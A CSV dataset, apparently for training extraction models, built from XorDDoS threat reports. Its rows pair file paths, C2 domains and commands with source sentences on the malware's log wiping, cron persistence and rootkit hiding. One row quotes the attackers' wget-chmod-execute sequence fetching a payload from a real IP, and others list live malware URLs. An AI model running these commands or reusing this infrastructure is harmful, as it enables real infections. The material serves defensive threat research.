report,word,verb,objectType,prettyReg,match,label,sentence
Xorddos-Ms.csv,/var/log/wtmp,run,FILE,/var/,0,0,"after running the elf file, uses an anti-forensic technique that hides its past activity by overwriting the content of the following sensitive files with a newline character: sensitive file	description /root/.bash_history	contains the commands that were run earlier /var/log/wtmp	contains login related record for users /var/log/btmp	contains record of failed login attempt /var/log/lastlog	contains the recent login information for users /var/log/secure	contains information related to security such as logs for authentication failure, sudo logins, and authorization privileges /var/log/boot.log	contains information related to system boot and message logged via system startup processes /var/log/cron	contains information related to cron job launch, success and failure error logs /var/log/dmesg	contains information related to kernel ring buffer messages, hardware devices, drivers, etc."
Xorddos-Ms.csv,www.enoan2107.com:3306,fetch,NET,"[a-zA-z]:\d{1,5}$",1,1,"after decoding the urls, it adds them into a remote list, which is later used to communicate and fetch commands from the command and control (c2) server: www.enoan2107.com:3306 www.gzcfr5axf6.com:3306 malicious activity threads after creating persistent entries, deleting evidence of its activities, and decoding config.rar, the malware initializes a cyclic redundancy check (crc) table followed by an unnamed semaphore using the sem_init api."
Xorddos-Ms.csv,chkconfig,perform,PROC,^chkconfig$,1,1,"additionally, it performs the following tasks on a provided $pid:  fetches the process file name corresponding to the provided $pid deletes the file for the provided $pid deletes the installed init services: deletes /etc/init.d/<file_name> for runlevels 1-5, unlinks and deletes /etc/rc<runlevel>.d/s90<file_name> performs the command chkconfig –del <file_name> performs the command update-rc.d <file_name> remove ends the process that was provided as an argument."
Xorddos-Ms.csv,/proc/rs_dev,use,FILE,/proc/rs_dev,0,0, xorddos uses /proc/rs_dev character device to communicate with the rootkit.
Xorddos-Ms.csv,"open(“/proc/3922/status”,",,FILE,/proc/,0,0,
Xorddos-Ms.csv,/var/run/gcc.pid,m6_6n3,FILE,/var/run/,0,0,encrypted strings	decoded value m7a4nq_/na	/usr/bin/ m [(n3	/bin/ m6_6n3	/tmp/ m4s4nac/n&zv\x1aa/tb	/var/run/gcc.pid m.[$n__#4%\c\x1ab]0	/lib/libudev.so m.[$n3	/lib/ m4s4nac/na	/var/run/ !#ff3ve.-7\x17v[_	cat resolv.conf <encrypted_remote_url>	hxxp://aa.hostasa[.
Xorddos-Ms.csv,/var/run/gcc.pid,read,FILE,/var/,1,1,"it performs the following tasks:  reads the content of the file /var/run/gcc.pid to get a unique 32-byte magic string that identifies the device while connecting with the c2 server; if the file doesn’t exist, then it creates the file and updates it with a random 32-byte string."
Xorddos-Ms.csv,/etc/cron.hourly/gcc.sh,drop,FILE,/etc/cron,1,1, dropped files dropped file path	file type	sha-256 /etc/init.d/hflggwyfsc.elf	shell script	6e506f32c6fb7b5d342d1382989ab191c6f21c2d311251d8f623814f468952cf /etc/cron.hourly/gcc.sh	shell script	cbb72e542e8f19240130fc9381c2351730d437d42926c6e68e056907c8456459 /lib/libudev.so	elf	f2df54eb827f3c733d481ebb167a5bc77c5ae39a6bda7f340bb23b24dc9a4432 /run/gcc.pid	text	932feef3ab6fccb3502f900619b1f87e1cb44a7adab48f2c927ecdd67ff6830a /usr/bin/djtctpzfdq	elf	53f062a93cf19aeaa2f8481b32118a31b658a126624abb8a7d82237884f0a394 /usr/bin/dmpyuitfoq	elf	798577202477c0c233d4af51c4d8fb2f574ddb3c9d1d90325d359a84cb1bd51c /usr/bin/fdinprytpq	elf	2b4500987d50a24ba5c118f506f2507362d6b5c63c80b1984b4ae86641779ff3 /usr/bin/jwvwvxoupv	elf	359c41da1cbae573d2c99f7da9eeb03df135f018f6c660b4e44fbd2b4ddecd39 /usr/bin/kagbjahdic	elf	e6c7eee304dfc29b19012ef6d31848c0b5bb07362691e4e9633c8581f1c2d65b /usr/bin/kkldnszwvq	elf	ef0a4c12d98dc0ad4db86aadd641389c7219f57f15642ed35b4443daf3ff8c1e /usr/bin/kndmhuqmah	elf	b5fba27a8e457c1ab6573c378171f057d151dc615d6a8d339195716fa9ac277a /usr/bin/qkxqoelrfa	elf	d71ea3b98286d39a711b626f687f0d3fc852c3e3a05de3f51450fb8f7bd2b0d7 /usr/bin/sykhrxsazz	elf	9d6f115f31ee71089cc85b18852974e349c68fad3276145dafd0076951f32489 /usr/bin/tcnszvmpqn	elf	360a6258dd66a3ba595a93896d9b55d22406d02e5c02100e5a18382c54e7d5cd /usr/bin/zalkpggsgh	elf	dc2b1cee161ebe90be68561755d99e66f454ad80b27cebe3d4773518ac45cbb7 /usr/bin/zvcarxfquk	elf	175667933088fbebcb62c8450993422ccc876495299173c646779a9e67501ff4 /tmp/bin/3200	elf (rootkit)	c8f761d3ef7cd16ebe41042a0daf901c2fdffce96c8e9e1fa0d422c6e31332ea installer script	bash script	8be8c950d8701ef1149c547ea3f949ea78394787ad1e19fc0eaa7bd7aeb863c2 /usr/bin/djtctpzfdq	elf	53f062a93cf19aeaa2f8481b32118a31b658a126624abb8a7d82237884f0a394 /usr/bin/jwvwvxoupv	elf	359c41da1cbae573d2c99f7da9eeb03df135f018f6c660b4e44fbd2b4ddecd39 /usr/bin/kkldnszwvq	elf	ef0a4c12d98dc0ad4db86aadd641389c7219f57f15642ed35b4443daf3ff8c1e /usr/bin/zvcarxfqul	elf (rootkit)	483451dcda78a381cc73474711bf3fcae97bd088f67b5a7e92639df52ef5ef25 /usr/bin/zvzvmpqnv	elf (rootkit)	c8f761d3ef7cd16ebe41042a0daf901c2fdffce96c8e9e1fa0d422c6e31332ea
Xorddos-Ms.csv,/var/run/gcc.pid,fetch,FILE,/run/,1,1,"  kill_process  the kill_process thread performs the following tasks:  decodes encrypted strings fetches file stats for /var/run/gcc.pid or, if none exist, then creates the file fetches file stats for /lib/libudev.so or, if none exist, then creates the directory /lib and creates a copy of itself at the location /lib/libudev.so fetches the on disk file information associated with the current process; if it fails, then exits the loop and stops the current process reads the content from kill_cfg and performs the corresponding actions, like stopping the process or deleting files, based on the matching specified keys in the configuration file, such as: md5= filename= rmfile= denyip= tcp_thread  the tcp_thread triggers the connection with the c2 server decoded earlier using decrypt_remotestr()."
Xorddos-Ms.csv,/etc/init.d/hflggwyfsc.elf.,,FILE,/etc/init.d/,0,0,
Xorddos-Ms.csv,/proc/rs_dev.,,FILE,/proc/rs_dev,0,0,
Xorddos-Ms.csv,gid,assign,INFO,GID(\$|\.|$),0,0," the following table describes the symbols found in the rootkit and their corresponding functionalities:  function name  	description   give_root  	provides a root privilege by setting a new set of credentials and assigning its uid, gid to “0” module_hide	hides the rootkit kernel module module_show	unhides the rootkit kernel module get_udp_seq_show	hides the udp4 connection by hooking /proc/net/udphides the udp6 connection by hooking /proc/net/udp6 get_tcp_seq_show	hides the tcp4 connection by hooking /proc/net/tcphides the tcp6 connection by hooking /proc/net/tcp6 hide_udp4_port	adds a provided port to a list of hidden udp4 ports unhide_udp4_port	deletes a provided port from a list of hidden udp4 ports hide_udp6_port	adds a provided port to a list of hidden udp6 ports unhide_udp6_port	deletes a provided port from a list of hidden udp6 ports hide_tcp4_port	adds a provided port to a list of hidden tcp4 ports unhide_tcp4_port	deletes a provided port from a list of hidden tcp4 ports hide_tcp6_port	adds a provided port to a list of hidden tcp6 ports unhide_tcp6_port	deletes a provided port from a list of hidden tcp6 ports unhide_allz	iterates list of all hidden ports and deletes all entries firewall_acceptip	adds an ip address provided to accept_ips list unfirewall_acceptip	deletes a provided entry from accept_ips list firewall_dropip	adds a provided ip address to drop_ips list unfirewall_dropip	deletes a provided ip address to drop_ips list hide_proc	adds a provided entry to hidden_procs list unhide_proc	deletes a provided entry to hidden_procs list"
Xorddos-Ms.csv,/proc/$pid,check,FILE,/proc/,0,0,"a user-mode process can get any process specific information by reading the /proc directory that contains the subdirectory for each running process on the system, such as:  /proc/7728 – contains process-id (pid) 7728-related information /proc/698 – contains pid 698-related information running the strace -e open ps command checks the traces of the open call on /proc/$pid to fetch information on running processes as part of the ps command."
Xorddos-Ms.csv,“0xda718716”,,MEM,mem_addr,0,0,
Xorddos-Ms.csv,/var/run/gcc.pid),,FILE,/var/run/,0,0,
Xorddos-Ms.csv,/var/run/,resolv.conf,FILE,/var/run/,0,0,encrypted strings	decoded value m7a4nq_/na	/usr/bin/ m [(n3	/bin/ m6_6n3	/tmp/ m4s4nac/n&zv\x1aa/tb	/var/run/gcc.pid m.[$n__#4%\c\x1ab]0	/lib/libudev.so m.[$n3	/lib/ m4s4nac/na	/var/run/ !#ff3ve.-7\x17v[_	cat resolv.conf <encrypted_remote_url>	hxxp://aa.hostasa[.
Xorddos-Ms.csv,/var/run/.,create,FILE,/run/,1,1,"if it’s not running from these locations, then it creates and copies itself using a 10-character string name on those locations, as well as /lib/ and /var/run/."
Xorddos-Ms.csv,/var/run/gcc.pid,m6_6n3,FILE,/run/,0,0,encrypted strings	decoded value m7a4nq_/na	/usr/bin/ m [(n3	/bin/ m6_6n3	/tmp/ m4s4nac/n&zv\x1aa/tb	/var/run/gcc.pid m.[$n__#4%\c\x1ab]0	/lib/libudev.so m.[$n3	/lib/ m4s4nac/na	/var/run/ !#ff3ve.-7\x17v[_	cat resolv.conf <encrypted_remote_url>	hxxp://aa.hostasa[.
Xorddos-Ms.csv,update-rc.d,,PROC,update-rc.d,0,0,
Xorddos-Ms.csv,sh,find,PROC,^sh$,0,0, the fake commands can include:  cat resolv.conf netstat -an bash whoami id cd /etc ifconfig eth0 ifconfig echo “find” uptime sh top gnome-terminal su netstat -antop grep “a” who ls -la pwd route -n ps -ef ls sleep 1
Xorddos-Ms.csv,/etc/init.d/hflggwyfsc.elf,drop,FILE,/etc/init.d/,1,1,figure 11. content of the init script dropped at the location /etc/init.d/hflggwyfsc.elf
Xorddos-Ms.csv,www.enoan2107.com:3306,download,NET,"[a-zA-z]:\d{1,5}$",0,0, download urls www.enoan2107.com:3306 www.gzcfr5axf6.com:3306 hxxp://aa.hostasa.org/config.rar
Xorddos-Ms.csv,/var/run/gcc.pid,fetch,FILE,/var/,0,0,"  kill_process  the kill_process thread performs the following tasks:  decodes encrypted strings fetches file stats for /var/run/gcc.pid or, if none exist, then creates the file fetches file stats for /lib/libudev.so or, if none exist, then creates the directory /lib and creates a copy of itself at the location /lib/libudev.so fetches the on disk file information associated with the current process; if it fails, then exits the loop and stops the current process reads the content from kill_cfg and performs the corresponding actions, like stopping the process or deleting files, based on the matching specified keys in the configuration file, such as: md5= filename= rmfile= denyip= tcp_thread  the tcp_thread triggers the connection with the c2 server decoded earlier using decrypt_remotestr()."
Xorddos-Ms.csv,/var/run/.,create,FILE,/var/,1,1,"if it’s not running from these locations, then it creates and copies itself using a 10-character string name on those locations, as well as /lib/ and /var/run/."
Xorddos-Ms.csv,/var/run/gcc.pid),,FILE,/run/,0,0,
Xorddos-Ms.csv,/var/run/gcc.pid,m6_6n3,FILE,/var/,0,0,encrypted strings	decoded value m7a4nq_/na	/usr/bin/ m [(n3	/bin/ m6_6n3	/tmp/ m4s4nac/n&zv\x1aa/tb	/var/run/gcc.pid m.[$n__#4%\c\x1ab]0	/lib/libudev.so m.[$n3	/lib/ m4s4nac/na	/var/run/ !#ff3ve.-7\x17v[_	cat resolv.conf <encrypted_remote_url>	hxxp://aa.hostasa[.
Xorddos-Ms.csv,/var/run/,resolv.conf,FILE,/run/,0,0,encrypted strings	decoded value m7a4nq_/na	/usr/bin/ m [(n3	/bin/ m6_6n3	/tmp/ m4s4nac/n&zv\x1aa/tb	/var/run/gcc.pid m.[$n__#4%\c\x1ab]0	/lib/libudev.so m.[$n3	/lib/ m4s4nac/na	/var/run/ !#ff3ve.-7\x17v[_	cat resolv.conf <encrypted_remote_url>	hxxp://aa.hostasa[.
Xorddos-Ms.csv,/var/log/dmesg,relate,FILE,/var/,0,0,"after running the elf file, uses an anti-forensic technique that hides its past activity by overwriting the content of the following sensitive files with a newline character: sensitive file	description /root/.bash_history	contains the commands that were run earlier /var/log/wtmp	contains login related record for users /var/log/btmp	contains record of failed login attempt /var/log/lastlog	contains the recent login information for users /var/log/secure	contains information related to security such as logs for authentication failure, sudo logins, and authorization privileges /var/log/boot.log	contains information related to system boot and message logged via system startup processes /var/log/cron	contains information related to cron job launch, success and failure error logs /var/log/dmesg	contains information related to kernel ring buffer messages, hardware devices, drivers, etc."
Xorddos-Ms.csv,/var/log/btmp,contain,FILE,/var/,0,0,"after running the elf file, uses an anti-forensic technique that hides its past activity by overwriting the content of the following sensitive files with a newline character: sensitive file	description /root/.bash_history	contains the commands that were run earlier /var/log/wtmp	contains login related record for users /var/log/btmp	contains record of failed login attempt /var/log/lastlog	contains the recent login information for users /var/log/secure	contains information related to security such as logs for authentication failure, sudo logins, and authorization privileges /var/log/boot.log	contains information related to system boot and message logged via system startup processes /var/log/cron	contains information related to cron job launch, success and failure error logs /var/log/dmesg	contains information related to kernel ring buffer messages, hardware devices, drivers, etc."
Xorddos-Ms.csv,suid/sgid,execute,INFO,GID(\$|\.|$),0,0, events with the following titles indicate threat activity related to xorddos:  the content of libudev.so was collected into libudev.so.6 bash process performed system information discovery by invoking ifconfig gcc.sh was executed after being dropped by hflggwyfsc.elf a shell command was executed by crond suid/sgid process unix_chkpwd executed screenshot of the microsoft 365 defender timeline showing the alert where a suspicious shell command run by crond was dropped from the malicious .elf.
Xorddos-Ms.csv,/var/run/gcc.pid,read,FILE,/var/run/,1,1,"it performs the following tasks:  reads the content of the file /var/run/gcc.pid to get a unique 32-byte magic string that identifies the device while connecting with the c2 server; if the file doesn’t exist, then it creates the file and updates it with a random 32-byte string."
Xorddos-Ms.csv,chkconfig,install,PROC,^chkconfig$,0,0,screenshot displaying chkconfig and update-rc.d commands installing the startup service figure 16. chkconfig and update-rc.d commands install the startup service argument-based code-flow xorddos has specific code paths corresponding to the number of arguments provided to the program.
Xorddos-Ms.csv,/run/gcc.pid,drop,FILE,/run/,0,0, dropped files dropped file path	file type	sha-256 /etc/init.d/hflggwyfsc.elf	shell script	6e506f32c6fb7b5d342d1382989ab191c6f21c2d311251d8f623814f468952cf /etc/cron.hourly/gcc.sh	shell script	cbb72e542e8f19240130fc9381c2351730d437d42926c6e68e056907c8456459 /lib/libudev.so	elf	f2df54eb827f3c733d481ebb167a5bc77c5ae39a6bda7f340bb23b24dc9a4432 /run/gcc.pid	text	932feef3ab6fccb3502f900619b1f87e1cb44a7adab48f2c927ecdd67ff6830a /usr/bin/djtctpzfdq	elf	53f062a93cf19aeaa2f8481b32118a31b658a126624abb8a7d82237884f0a394 /usr/bin/dmpyuitfoq	elf	798577202477c0c233d4af51c4d8fb2f574ddb3c9d1d90325d359a84cb1bd51c /usr/bin/fdinprytpq	elf	2b4500987d50a24ba5c118f506f2507362d6b5c63c80b1984b4ae86641779ff3 /usr/bin/jwvwvxoupv	elf	359c41da1cbae573d2c99f7da9eeb03df135f018f6c660b4e44fbd2b4ddecd39 /usr/bin/kagbjahdic	elf	e6c7eee304dfc29b19012ef6d31848c0b5bb07362691e4e9633c8581f1c2d65b /usr/bin/kkldnszwvq	elf	ef0a4c12d98dc0ad4db86aadd641389c7219f57f15642ed35b4443daf3ff8c1e /usr/bin/kndmhuqmah	elf	b5fba27a8e457c1ab6573c378171f057d151dc615d6a8d339195716fa9ac277a /usr/bin/qkxqoelrfa	elf	d71ea3b98286d39a711b626f687f0d3fc852c3e3a05de3f51450fb8f7bd2b0d7 /usr/bin/sykhrxsazz	elf	9d6f115f31ee71089cc85b18852974e349c68fad3276145dafd0076951f32489 /usr/bin/tcnszvmpqn	elf	360a6258dd66a3ba595a93896d9b55d22406d02e5c02100e5a18382c54e7d5cd /usr/bin/zalkpggsgh	elf	dc2b1cee161ebe90be68561755d99e66f454ad80b27cebe3d4773518ac45cbb7 /usr/bin/zvcarxfquk	elf	175667933088fbebcb62c8450993422ccc876495299173c646779a9e67501ff4 /tmp/bin/3200	elf (rootkit)	c8f761d3ef7cd16ebe41042a0daf901c2fdffce96c8e9e1fa0d422c6e31332ea installer script	bash script	8be8c950d8701ef1149c547ea3f949ea78394787ad1e19fc0eaa7bd7aeb863c2 /usr/bin/djtctpzfdq	elf	53f062a93cf19aeaa2f8481b32118a31b658a126624abb8a7d82237884f0a394 /usr/bin/jwvwvxoupv	elf	359c41da1cbae573d2c99f7da9eeb03df135f018f6c660b4e44fbd2b4ddecd39 /usr/bin/kkldnszwvq	elf	ef0a4c12d98dc0ad4db86aadd641389c7219f57f15642ed35b4443daf3ff8c1e /usr/bin/zvcarxfqul	elf (rootkit)	483451dcda78a381cc73474711bf3fcae97bd088f67b5a7e92639df52ef5ef25 /usr/bin/zvzvmpqnv	elf (rootkit)	c8f761d3ef7cd16ebe41042a0daf901c2fdffce96c8e9e1fa0d422c6e31332ea
Xorddos-Ms.csv,/proc/rs_dev,have,FILE,/proc/,0,0,"in this case, the malware has a provision for communicating with its rootkit component /proc/rs_dev by sending input and output control (ioctl) calls with additional information to take appropriate action."
Xorddos-Ms.csv,/proc/self/exe,call,FILE,/proc/,0,0,"before handling the argument-based control, it calls the readlink api with the first parameter as /proc/self/exe to fetch its full process path."
Xorddos-Ms.csv,/etc/crontab,delete,FILE,/etc/cron,0,0, it then creates a /etc/crontab file to run /etc/cron.hourly/gcc.sh every three minutes:  screenshot displaying the system command to delete the /etc/cron.hourly/gcc.sh entry from /etc/crontab file and add a new entry.
Xorddos-Ms.csv,/var/run/gcc.pid),,FILE,/var/,0,0,
Xorddos-Ms.csv,/var/run/,resolv.conf,FILE,/var/,0,0,encrypted strings	decoded value m7a4nq_/na	/usr/bin/ m [(n3	/bin/ m6_6n3	/tmp/ m4s4nac/n&zv\x1aa/tb	/var/run/gcc.pid m.[$n__#4%\c\x1ab]0	/lib/libudev.so m.[$n3	/lib/ m4s4nac/na	/var/run/ !#ff3ve.-7\x17v[_	cat resolv.conf <encrypted_remote_url>	hxxp://aa.hostasa[.
Xorddos-Ms.csv,/proc/rs_dev,have,FILE,/proc/rs_dev,0,0,"in this case, the malware has a provision for communicating with its rootkit component /proc/rs_dev by sending input and output control (ioctl) calls with additional information to take appropriate action."
Xorddos-Ms.csv,/proc/net/udphides,hook,FILE,/proc/,0,0," the following table describes the symbols found in the rootkit and their corresponding functionalities:  function name  	description   give_root  	provides a root privilege by setting a new set of credentials and assigning its uid, gid to “0” module_hide	hides the rootkit kernel module module_show	unhides the rootkit kernel module get_udp_seq_show	hides the udp4 connection by hooking /proc/net/udphides the udp6 connection by hooking /proc/net/udp6 get_tcp_seq_show	hides the tcp4 connection by hooking /proc/net/tcphides the tcp6 connection by hooking /proc/net/tcp6 hide_udp4_port	adds a provided port to a list of hidden udp4 ports unhide_udp4_port	deletes a provided port from a list of hidden udp4 ports hide_udp6_port	adds a provided port to a list of hidden udp6 ports unhide_udp6_port	deletes a provided port from a list of hidden udp6 ports hide_tcp4_port	adds a provided port to a list of hidden tcp4 ports unhide_tcp4_port	deletes a provided port from a list of hidden tcp4 ports hide_tcp6_port	adds a provided port to a list of hidden tcp6 ports unhide_tcp6_port	deletes a provided port from a list of hidden tcp6 ports unhide_allz	iterates list of all hidden ports and deletes all entries firewall_acceptip	adds an ip address provided to accept_ips list unfirewall_acceptip	deletes a provided entry from accept_ips list firewall_dropip	adds a provided ip address to drop_ips list unfirewall_dropip	deletes a provided ip address to drop_ips list hide_proc	adds a provided entry to hidden_procs list unhide_proc	deletes a provided entry to hidden_procs list"
Xorddos-Ms.csv,/etc/cron.hourly/gcc.sh.the,pass,FILE,/etc/cron,0,0, cron script  the malware creates a cron script at the location /etc/cron.hourly/gcc.sh.the cron script passes parameters with the following content:  screenshot of the contents of the gcc.sh script.
Xorddos-Ms.csv,chkconfig,add,PROC,^chkconfig$,0,0,the commands chkconfig –add <service_name> and update-rc.d then add a service that starts the daemon process at boot.
Xorddos-Ms.csv,/proc/net/tcphides,provide,FILE,/proc/,0,0," the following table describes the symbols found in the rootkit and their corresponding functionalities:  function name  	description   give_root  	provides a root privilege by setting a new set of credentials and assigning its uid, gid to “0” module_hide	hides the rootkit kernel module module_show	unhides the rootkit kernel module get_udp_seq_show	hides the udp4 connection by hooking /proc/net/udphides the udp6 connection by hooking /proc/net/udp6 get_tcp_seq_show	hides the tcp4 connection by hooking /proc/net/tcphides the tcp6 connection by hooking /proc/net/tcp6 hide_udp4_port	adds a provided port to a list of hidden udp4 ports unhide_udp4_port	deletes a provided port from a list of hidden udp4 ports hide_udp6_port	adds a provided port to a list of hidden udp6 ports unhide_udp6_port	deletes a provided port from a list of hidden udp6 ports hide_tcp4_port	adds a provided port to a list of hidden tcp4 ports unhide_tcp4_port	deletes a provided port from a list of hidden tcp4 ports hide_tcp6_port	adds a provided port to a list of hidden tcp6 ports unhide_tcp6_port	deletes a provided port from a list of hidden tcp6 ports unhide_allz	iterates list of all hidden ports and deletes all entries firewall_acceptip	adds an ip address provided to accept_ips list unfirewall_acceptip	deletes a provided entry from accept_ips list firewall_dropip	adds a provided ip address to drop_ips list unfirewall_dropip	deletes a provided ip address to drop_ips list hide_proc	adds a provided entry to hidden_procs list unhide_proc	deletes a provided entry to hidden_procs list"
Xorddos-Ms.csv,/var/run/gcc.pid,read,FILE,/run/,0,0,"it performs the following tasks:  reads the content of the file /var/run/gcc.pid to get a unique 32-byte magic string that identifies the device while connecting with the c2 server; if the file doesn’t exist, then it creates the file and updates it with a random 32-byte string."
Xorddos-Ms.csv,/var/run/gcc.pid,fetch,FILE,/var/run/,0,0,"  kill_process  the kill_process thread performs the following tasks:  decodes encrypted strings fetches file stats for /var/run/gcc.pid or, if none exist, then creates the file fetches file stats for /lib/libudev.so or, if none exist, then creates the directory /lib and creates a copy of itself at the location /lib/libudev.so fetches the on disk file information associated with the current process; if it fails, then exits the loop and stops the current process reads the content from kill_cfg and performs the corresponding actions, like stopping the process or deleting files, based on the matching specified keys in the configuration file, such as: md5= filename= rmfile= denyip= tcp_thread  the tcp_thread triggers the connection with the c2 server decoded earlier using decrypt_remotestr()."
Xorddos-Ms.csv,/proc/7728,contain,FILE,/proc/,0,0,"a user-mode process can get any process specific information by reading the /proc directory that contains the subdirectory for each running process on the system, such as:  /proc/7728 – contains process-id (pid) 7728-related information /proc/698 – contains pid 698-related information running the strace -e open ps command checks the traces of the open call on /proc/$pid to fetch information on running processes as part of the ps command."
Xorddos-Trendmicro.csv,/etc/rc{1-5}.d/s90{random,,FILE,/etc/rc,0,0,
Xorddos-Trendmicro.csv,/var/run/gcc.pid,read,FILE,/var/,1,1,creates symbolic links which points to the script in /etc/init.d: /etc/rc{1-5}.d/s90{random numbers} /etc/rc.d/rc{1-5}.d/s90{random numbers} get the magic string value from the file /var/run/gcc.pid read the following from its configuration file: md5 - checksum of file denyip - open communication with an ip filename - list of filename rmfile - files to remove
Xorddos-Trendmicro.csv,/var/run/gcc.pid,read,FILE,/run/,1,1,creates symbolic links which points to the script in /etc/init.d: /etc/rc{1-5}.d/s90{random numbers} /etc/rc.d/rc{1-5}.d/s90{random numbers} get the magic string value from the file /var/run/gcc.pid read the following from its configuration file: md5 - checksum of file denyip - open communication with an ip filename - list of filename rmfile - files to remove
Xorddos-Trendmicro.csv,/var/run/gcc.pid,read,FILE,/var/run/,1,1,creates symbolic links which points to the script in /etc/init.d: /etc/rc{1-5}.d/s90{random numbers} /etc/rc.d/rc{1-5}.d/s90{random numbers} get the magic string value from the file /var/run/gcc.pid read the following from its configuration file: md5 - checksum of file denyip - open communication with an ip filename - list of filename rmfile - files to remove
Xorddos-Trendmicro.csv,/etc/cron.hourly/gcc.sh,drop,FILE,/etc/cron,1,1, this backdoor drops the following files:  /etc/cron.hourly/gcc.sh (cron is a time-based job scheduler in unix-like computer operating systems) backdoor routine
Xorddos-Trendmicro.csv,{blocked}t456.com/dd.rar:1520,,NET,"[a-zA-z]:\d{1,5}$",0,0,
Xorddos-Trendmicro2.csv,http://122.51.133.49:10086/vip,wget,NET,ip_addr,1,1,"afterwards, the attackers executed the following sequence of commands to all containers, infecting all of them with the xorddos malware:  wget http://122.51.133.49:10086/vip –o vip chmod 777 vip ./vip the xorddos payload (detected by trend micro as backdoor.linux.xorddos.ae) still used the xor-key it used in other recorded attacks, bb2fa36aaa9541f0, to encrypt its strings and to communicate with the command and control (c&c) server."
Xorddos-Trendmicro2.csv,http://62.171.160.189/linux_arm,find,NET,ip_addr,1,1, indicators of compromise kaiji  file name	sha 256	trend micro pattern detection 123.sh	9301d983e9d8fad3cc205ad67746cd111024daeb4f597a77934c7cfc1328c3d8	trojan.sh.kaiji.a linux_arm	d315b83e772dfddbd2783f016c38f021225745eb43c06bbdfd92364f68fa4c56	ddos.linux.kaiji.a related urls:  http://62.171.160.189/linux_arm http://62.171.160.189/11/123.sh xorddos and other malware variants found through the same url  sha 256	trend micro pattern detection dba757c20fbc1d81566ef2877a9bfca9b3ddb84b9f04c0ca5ae668b7f40ea8c3	backdoor.linux.xorddos.ae 6c8f95b82592ac08a03bfe32e4a4dbe637d1f542eb3ab3054042cec8ec301a3c	backdoor.linux.dofloo.ab 286f774eb5b4f2f7c62d5e68f02a37b674cca7b8c861e189f1f596789322f9fe	backdoor.win32.sddos.a related url:  http://122.51.133.49:10086/vip
